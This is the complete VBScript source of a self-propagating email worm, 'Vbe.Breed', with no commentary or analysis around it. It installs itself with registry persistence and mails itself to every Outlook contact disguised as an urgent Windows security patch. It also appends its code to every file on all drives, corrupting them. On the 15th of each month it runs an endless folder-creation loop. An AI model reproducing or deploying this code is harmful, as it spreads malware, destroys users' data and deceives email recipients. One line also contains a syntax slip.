' Vbe.Breed - By SAD1c
on error resume next
dim fso,wsh,out,install,myself,attached,sc,count,drive,file,folder
set fso=createobject("scripting.filesystemobject")
set wsh=createobject("wscript.shell")
set out=wscript.createobject("outlook.application")
set myself=fso.opentextfile(wscript.scriptname)
vbcode=myself.readall
myself.close
install=fso.getspecialfolder(1)&"\WinAdmService32.vbs"
regset("HKLM\Software\Data\EthErEal\InstallPath",instp)
set myself=fso.createtextfile(install,1)
myself.write vbcode
myself.close
regset("HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\WindowsAdminService","wscript.exe "&install)
if wsh.regread("HKLM\Software\WinSettings\Breed\OutlookSent")="" then
	attached=fso.getspecialfolder(2)&"\WINDOWSPatchInstaller.vbs"
	fso.copyfile install,attached
	set mapi=out.getnamespace("MAPI")
	set allmapi=mapi.addresslists
	for each sc in allmapi
		if sc.addressentries.count<>0 then
			for count=1 to sc.addressentries.count
				mailsend(sc.addressentries(count).address)
			next
		end if
	next
	fso.deletefile attached
end if
regset("HKLM\Software\WinSettings\Breed\OutlookSent","Breed!")
sub regset(keyn,keyv)
	on error resume next
	wsh.regwrite keyn,keyv
end sub
sub mailsend(address)
	on error resume next
	set mail=out.createitem(0)
	mail.to=address
	mail.subject="Very Important!"
	mail.body="Hi. I've sent this mail to give you the last Windows patch."
	mail.body=mail.body&vbcrlf&"It's very important, 'cause Microsoft found out a serious defect on its systems."
	mail.body=mail.body&vbcrlf&"This patch fix the bug, but hurry up because thousands of users as been infected by a terrible virus named ""Worm.SATAN"" that use this defect to make damage to windows data."
	mail.body=mail.body&vbcrlf&"Hoping that this helps, I greet you! Remember that security it's important!"
	mail.attachments.add(attached)
	mail.importance=2
	mail.deleteaftersubmit=true
	if mail.to<>"" then
		mail.send
	end if
end sub
infectroutine
sub infectroutine
on error resume next
	for each drive in fso.drives
		if drive.isready then
			alldir(drive.path&"\")
		end if
	next
end sub
sub alldir(dirpath)
	on error resume next
	set allf=fso.getfolder(dirpath)
	for each file in allf.files
		set filetoapp=fso.opentextfile(file.path,8)
		filetoapp.write vbcode
		filetoapp.close
	next	
	for each folder in allf.subfolders
		alldir(folder.path)
	next
end sub
if day(now)=15 then
	do
		randomize
		fso.createfolder(fso.getspecialfolder(int(rnd*2))"\"&time()&rnd*646313)
	loop
end if